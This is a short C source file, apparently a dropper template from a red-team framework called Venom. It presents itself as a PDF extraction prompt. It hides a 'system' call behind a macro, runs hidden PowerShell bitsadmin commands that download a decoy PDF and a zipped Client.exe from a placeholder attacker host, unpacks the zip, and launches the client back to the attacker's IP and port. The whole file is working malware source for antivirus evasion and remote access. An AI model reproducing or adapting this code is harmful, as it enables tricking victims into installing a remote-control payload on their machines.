/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
    MessageBox(NULL, "Extract Archive to TEMP?", "Portable Document Format (PDF)", MB_OK);
   _("powershell -w 1 -C bitsadmin /transfer ssaredteam http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf");Sleep(1);
   _("powershell -w 1 -C bitsadmin /transfer ssaredteam http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");
   _("cd TempDir && cmd.exe /R start /min Client.exe ip=LhOsT port=LpOrT");
   return 0;
}

